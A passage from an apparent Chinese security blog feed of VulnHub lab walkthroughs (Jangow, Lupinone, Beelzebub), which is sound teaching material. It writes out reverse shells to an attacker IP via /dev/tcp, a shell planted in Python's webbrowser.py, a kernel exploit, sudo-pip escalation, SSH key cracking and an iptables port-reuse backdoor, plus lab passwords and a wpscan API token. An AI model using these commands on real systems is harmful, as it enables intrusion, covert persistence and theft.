data-src=\"/N1h1l157/VULNHUB/image-409.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-410.png\" alt></p>\n<p>换了多个端口都失败了，最后查阅资料，发现服务器关闭了除 443 以外的端口，监听 443 端口，访问 url 地址，将命令执行等待反弹，访问 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS8xLnBocA==\">http://192.168.31.27/site/1.php</span> 时，命令被执行，shell 成功反弹</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-411.png\" alt></p>\n<p>-&gt; 拿到服务器权限</p>\n<h3 id=\"翻阅文件突破\"><a class=\"markdownIt-Anchor\" href=\"#翻阅文件突破\">#</a> 翻阅文件突破</h3>\n<p>翻阅网站文件，找到数据库配置文件 config.php，有用户名和密码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-412.png\" alt></p>\n<p>-&gt; /var/www/html/site/wordpress/config.php desafio02:abygurl69</p>\n<p>找到一个网站的备份文件，同样有一个用户名和密码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-413.png\" alt></p>\n<p>-&gt; /var/www/html/.backup jangow01:abygurl69</p>\n<p>尝试用户名密码登陆，通过 jangow01:abygurl69 登陆成功</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-414.png\" alt></p>\n<p>-&gt; 获取到 jangow01 权限</p>\n<h3 id=\"ftp-上传-exp\"><a class=\"markdownIt-Anchor\" href=\"#ftp-上传-exp\">#</a> FTP 上传 EXP</h3>\n<p>服务器存在 s 权限的 pkexec，尝试 pkexec 提权，同时收集到服务器版本为 4.4.0-31 ubuntu</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-415.png\" alt></p>\n<p>提前准备好的 pkexec exp 在 kali 上，将其发送至靶机上</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-416.png\" alt></p>\n<p>kali 开启的 python 简易 web 服务器后无法下载，可能被限制了<br>\n而且 ssh 服务并没有启动，用不了 scp 传输文件，并且 ping 不到 kali 机器上</p>\n<p>通过靶机上开放的 ftp 来传输文件，将 CVE- 2021 - 4034 .zip 发送服务器上<br>\n通过 jangow01:abygurl69 成功登陆到了 ftp 服务上</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-417.png\" alt></p>\n<p>发送 CVE-2021-4034 文件时报错，显示不能发送文件夹</p>\n<p>因此改为了发送 CVE-2021-4034.zip 文件</p>\n<p>继续在反弹的 shell 上执行，当编译时，发现没有 make 命令</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-418.png\" alt></p>\n<p>-&gt; 提权失败，需要通过其他的方式提权</p>\n<h3 id=\"searchsploit-提权\"><a class=\"markdownIt-Anchor\" href=\"#searchsploit-提权\">#</a> searchsploit 提权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">注意到服务器的版本是ubuntu 4.4.0的，用 searchsploit 寻找漏洞</span></span><br><span class=\"line\">searchsploit ubuntu 4.4.0- 31</span><br><span class=\"line\">searshsploit -x linux/local/45010.c 找到payload的确切位置</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-419.png\" alt></p>\n<p><code>cp /usr/share/exploitdb/exploits/linux/local/45010.c .</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-420.png\" alt></p>\n<p>通过 ftp 将内核漏洞权限提升的脚本上传，lcd 可以在 ftp 中用来切换本地的路径，cd 可以在 ftp 中用来切换所属 ftp 服务的主机的目录</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-421.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将上传的 45010.c文件编译运行</span></span><br><span class=\"line\">gcc 45010.c -o exp</span><br><span class=\"line\">chmod +x exp &amp;&amp; ./exp</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-422.png\" alt></p>\n<p>-&gt; 提权成功，拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/116%20LUPINONE/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/116%20LUPINONE/",
            "title": "VULNHUB 16 LUPINONE",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZW1waXJlLWx1cGlub25lLDc1MC8=\">https://www.vulnhub.com/entry/empire-lupinone,750/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDAzMTg0L2FydGljbGUvZGV0YWlscy8xMjI3NjY0ODM=\">https://blog.csdn.net/qq_45403184/article/details/122766483</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 LUPINONE：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-331.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.236</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.236</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-332.png\" alt></p>\n<p>-&gt; 靶机开放端口 22, 80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTM2\">http://192.168.31.136</span> 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-333.png\" alt></p>\n<p>是一个没有任何可以点击的单纯的页面，并且审查源代码没有任何提示</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gobuster dir -u http://192.168.31.236 -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-334.png\" alt></p>\n<p>扫描到了 robots.txt 这个文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-335.png\" alt></p>\n<p>-&gt; 得到一个提示 /～myfiles</p>\n<h3 id=\"wfuzz-模糊测试\"><a class=\"markdownIt-Anchor\" href=\"#wfuzz-模糊测试\">#</a> wfuzz 模糊测试</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">可能隐藏的含义是，一个缺少参数的后门文件</span></span><br><span class=\"line\">wfuzz -c -u http://192.168.31.236/~myfiles/?FUZZ=xxx -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</span><br></pre></td></tr></table></figure>\n<p>扫描是否存在 http://192.168.31.236/~myfiles/?FUZZ=xx</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-336.png\" alt></p>\n<p>返回结果全是 200 即表示不存在拼接参数</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">也可能是一个目录结构，首字符为～的形式</span></span><br><span class=\"line\">wfuzz -c -u http://192.168.31.236/~FUZZ -w /usr/share/wordlists/dirbuster/directory-</span><br><span class=\"line\">list-2.3-medium.txt</span><br></pre></td></tr></table></figure>\n<p>扫描是否存在 http://192.168.31.236/～FUZZ</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-337.png\" alt></p>\n<p>返回结果都是 404</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">过滤掉 404 继续扫描</span></span><br><span class=\"line\">wfuzz -c -u http://192.168.31.236/~FUZZ -w /usr/share/wordlists/dirbuster/directory-</span><br><span class=\"line\">list-2.3-medium.txt | grep -v 404</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-338.png\" alt></p>\n<p>扫到了一个特殊的目录 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjM2L35zZWNyZXQ=\">http://192.168.31.236/~secret</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-339.png\" alt></p>\n<p>-&gt; 提示有一个 ssh 私钥文件隐藏在这个目录下，并且需要 fasttrack 这个字典，有一个用户叫做 icex64</p>\n<h3 id=\"burp-加载字典爆破\"><a class=\"markdownIt-Anchor\" href=\"#burp-加载字典爆破\">#</a> burp 加载字典爆破</h3>\n<p>burp 做代理，拦截浏览器请求，识别是否存在隐藏文件.a.txt 的文件将 a 与 txt 作为变量，进行多次重发数据</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-340.png\" alt></p>\n<p>选择字典，第一个字典我选用的是 kali 中的 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-341.png\" alt></p>\n<p>第二个字典是几种比较可能的私钥文件后缀:.txt,.pub,.html,.cer,.pem,.der,.key</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-342.png\" alt></p>\n<p>数据装载完毕，开始爆破</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-343.png\" alt></p>\n<p>-&gt; 唯一返回的 200 状态码的是 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjM2L35zZWNyZXQvLm15c2VjcmV0LnR4dA==\">http://192.168.31.236/~secret/.mysecret.txt</span></p>\n<h3 id=\"ffuf-模糊测试\"><a class=\"markdownIt-Anchor\" href=\"#ffuf-模糊测试\">#</a> ffuf 模糊测试</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">或者用ffuf的方法进行爆破目录</span></span><br><span class=\"line\">ffuf -u &quot;http://192.168.31.236/~secret/.FUZZ&quot; -w /usr/share/seclists/Discovery/Web-</span><br><span class=\"line\">Content/directory-list-2.3-medium.txt - e .txt,.pub,.html,.cer,.pem,.der,.key</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-344.png\" alt></p>\n<p>-&gt; 获得关键网址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjM2L35zZWNyZXQvLm15c2VjcmV0LnR4dA==\">http://192.168.31.236/~secret/.mysecret.txt</span></p>\n<h3 id=\"cyberchef-解密\"><a class=\"markdownIt-Anchor\" href=\"#cyberchef-解密\">#</a> CyberChef 解密</h3>\n<p>访问该网址，得到了一串密码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-345.png\" alt></p>\n<p>用 CyberChef 通过 magic 方法在线解密，得到是 base58 解密，复制解密代码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-346.png\" alt></p>\n<p>观察得到的密文，发现仍然是加密的！并不是真正的 ssh 私钥！</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-347.png\" alt></p>\n<h3 id=\"john-破解私钥\"><a class=\"markdownIt-Anchor\" href=\"#john-破解私钥\">#</a> john 破解私钥</h3>\n<p>采用 ssh2join.py 来破解 ssh 私钥，john 是一个破解系统密码的工具。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">寻找 ssh2join.py 位置</span></span><br><span class=\"line\">使用locate sshjoin.py没有发现ssh2join.py文件</span><br><span class=\"line\">改用find / -name “ssh2john.py”</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用工具 ssh2john 转换为可以识别的信息</span></span><br><span class=\"line\">python /usr/share/john/ssh2john.py ~/Desktop/tool/lupin/vulnhub_lupin &gt; crack.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-348.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">接下来要使用到上文所提示到的fastrack.txt文件</span><br><span class=\"line\">find / -name “fasttrack.txt”</span><br><span class=\"line\">john crack.txt --wordlist=/usr/share/wordlists/fasttrack.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-349.png\" alt></p>\n<p>-&gt; 得到私钥文件的密码 P@55w0rd!</p>\n<p>指定私钥文件登陆对方服务器，选择密钥的密码为破解的密码</p>\n<p><code>ssh icex64@192.168.31.236 -i vulnhub_lupin</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-350.png\" alt></p>\n<p>成功登陆到了服务器，并且有一个隐私设置问题</p>\n<p>-&gt; 可以无密码调用 arsene 用户去执行这个文件</p>\n<h3 id=\"py-依赖库修改\"><a class=\"markdownIt-Anchor\" href=\"#py-依赖库修改\">#</a> py 依赖库修改</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">直接将反弹shell的代码打印到此文件中</span></span><br><span class=\"line\">echo “bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1” &gt;&gt; /home/arsene/heist.py</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-351.png\" alt></p>\n<p>没有权限去加载此 payload，翻阅目录，查找更多的敏感信息，发现这个文件里边有引入包 webbrower 这个操作，还有一份提示文件，这个提示文件就是说要运行此 python 文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">locate webbrowser寻找此文件 没有找到</span><br><span class=\"line\">find / -name “webbrowser”</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-352.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将反弹shell的代码加载到此文件中</span></span><br><span class=\"line\">vim /usr/lib/python3.9/webbrowser.py</span><br><span class=\"line\">os.system(&#x27;/usr/bin/bash /tmp/shell.sh&#x27;)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell.sh内容如下</span></span><br><span class=\"line\">cat &gt; /tmp/shell.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1</span><br><span class=\"line\">EOF</span><br><span class=\"line\">chmod +x /tmp/shell.sh</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">调用 arsene 去执行该文件</span></span><br><span class=\"line\">sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-353.png\" alt></p>\n<p>-&gt; 监听 4444 ，并且拿到了 arsene 用户的 shell</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-354.png\" alt></p>\n<h3 id=\"sudopip提权\"><a class=\"markdownIt-Anchor\" href=\"#sudopip提权\">#</a> sudo (pip) 提权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看权限设置问题</span></span><br><span class=\"line\">sudo -l</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">pip提权</span></span><br><span class=\"line\">TF=$(mktemp -d)</span><br><span class=\"line\">echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt;</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">TF/setup.py</span></span><br><span class=\"line\">sudo pip install $TF</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-355.png\" alt></p>\n<p>-&gt; 成功拿到 root 权限</p>\n<h3 id=\"iptables-端口复用\"><a class=\"markdownIt-Anchor\" href=\"#iptables-端口复用\">#</a> iptables 端口复用</h3>\n<p>这里不做权限维持，直接上的权限隐藏，注意攻击机是 192.168.31.237 靶机是 192.168.31.236</p>\n<p>在目标服务器上依次执行以下命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建端口复用链子：</span></span><br><span class=\"line\">iptables -t nat -N MyChains</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">创建端口复用规则，访问192.168.3.6:80的流量转发至 22 端口：(如果要转发到其他ip机器，注意需要开启转发功能)</span></span><br><span class=\"line\">iptables -t nat -A MyChains -p tcp -j REDIRECT --to-port 22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置开启开关，当接收到一个含有<span class=\"string\">&quot;nihao123coming&quot;</span>的TCP包，则将来源IP添加到MyChains的列表中</span></span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &quot;nihao123coming&quot; --algo bm -m recent --</span><br><span class=\"line\">set --name MyChains --rsource -j ACCEPT</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置关闭开关，如果接收到含有<span class=\"string\">&quot;nihao123leaving&quot;</span>的TCP包，则将来源IP从MyChains的列表中删除</span></span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &quot;nihao123leaving&quot; --algo bm -m recent --</span><br><span class=\"line\">name MyChains --remove -j ACCEPT</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">当发现SYN包的来源IP处于MyChains的列表中，将跳转到MyChains链进行处理，有效时间为 3600 秒</span></span><br><span class=\"line\">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds</span><br><span class=\"line\">3600 --name MyChains --rsource -j MyChains</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-356.png\" alt></p>\n<p>攻击机上执行以下命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">开启复用，开启后发送开启命令的机器到目标 80 端口的流量将被转发到目标 20 端口</span></span><br><span class=\"line\">nc 192.168.3.6 80</span><br><span class=\"line\">nihao123coming</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-357.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -p 80 icex64@192.168.31.236</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-358.png\" alt></p>\n<p>从攻击机连接目标机器的 80 端口成功，此时 80 的网站我们将无法访问</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-359.png\" alt></p>\n<p>用其他 ip 访问此网站也是打不开的</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-360.png\" alt></p>\n<p>关闭复用</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc 192.168.3.236 80</span><br><span class=\"line\">nihao123leaving</span><br><span class=\"line\">ssh -p 80 icex64@192.168.31.236</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将不能通过 80 连接，并且网站恢复正常</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-361.png\" alt></p>\n<p>-&gt; iptables 端口复用成功，可在攻击机上执行 nc 192.168.3.236 80 即可来开启或者关闭对方的 80 网站，从而进入到目标主机</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/120%20BEELZEBUB/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/120%20BEELZEBUB/",
            "title": "VULNHUB 20 BEELZEBUB",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmVlbHplYnViLTEsNzQyLw==\">https://www.vulnhub.com/entry/beelzebub-1,742/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU2NzkwNjcuaHRtbA==\">https://www.cnblogs.com/sainet/p/15679067.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 BEELZEBUB：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-455.png\" alt></p>\n<p>-&gt; 靶机 ip：192.168.31.102</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.102</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-456.png\" alt></p>\n<p>-&gt; 靶机开放端口 22,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAy\">http://192.168.31.102</span> 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-457.png\" alt></p>\n<p><code>dirsearch -u http://192.168.31.102</code> <br>\n <code>gobuster dir -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.102</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-458.png\" alt></p>\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyL3BocG15YWRtaW4vZG9jL2h0bWwvaW5kZXguaHRtbA==\">http://192.168.31.102/phpmyadmin/doc/html/index.html</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-459.png\" alt></p>\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyL3BocG15YWRtaW4v\">http://192.168.31.102/phpmyadmin/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-460.png\" alt></p>\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyL3BocGluZm8ucGhw\">http://192.168.31.102/phpinfo.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-461.png\" alt></p>\n<p>并没有发现可以直接利用的漏洞，用 dirb 做更深的目录结构扫描</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-462.png\" alt></p>\n<p>-&gt; 还是没有什么发现</p>\n<h3 id=\"源代码信息检索\"><a class=\"markdownIt-Anchor\" href=\"#源代码信息检索\">#</a> 源代码信息检索</h3>\n<p>对已经存在的网址进行源代码的审查: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyL2luZGV4LnBocA==\">http://192.168.31.102/index.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-463.png\" alt></p>\n<p>猜测这句话的意思是原本存在目录结构为 beelzebub 的目录，为了防止被攻击，将此目录结构以 md5 加密，所以会有一个 beelzebub 的 md5 加密后的目录</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-464.png\" alt></p>\n<p>判断猜测是否正确，搜寻此目录下是否存在其他文件</p>\n<p><code>dirsearch -u http://192.168.31.102/d18e1e22becbd915b45e0e655429d487</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-465.png\" alt></p>\n<p>根据目录结构中的许多关键词如 wp 可以判断出这是一个二级 wordpress 站点<br>\n wp-login.php 进入到登陆界面，发现一直在转圈</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-466.png\" alt></p>\n<h3 id=\"wpscan-强制扫描\"><a class=\"markdownIt-Anchor\" href=\"#wpscan-强制扫描\">#</a> wpscan 强制扫描</h3>\n<p>通过 wpscan 工具来对网站进行一波用户名的枚举</p>\n<p><code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/ --e</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-467.png\" alt></p>\n<p>wpscan 扫描失败，根据提示加上对应的参数扫描<br>\n <code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/ --enumerate u --ignore-main-redirect</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-468.png\" alt></p>\n<p>wpscan 扫描仍然失败，提示的是未检测到此 CMS，加 force 强制扫描<br>\n <code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487 --enumerate u --ignore-main-redirect --force</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-469.png\" alt></p>\n<p>-&gt; 开始正常扫描，枚举出了两个用户名 valak 和 krampus</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-470.png\" alt></p>\n<p>通过已有的用户名来爆破密码<br>\n <code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/ -U 'valak,krampus' -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --ignore-main-redirect --force</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-471.png\" alt></p>\n<p>-&gt; 密码破解失败，无法获取到密码，将从其他 url 地址上寻找突破</p>\n<h3 id=\"cookie-密码泄漏\"><a class=\"markdownIt-Anchor\" 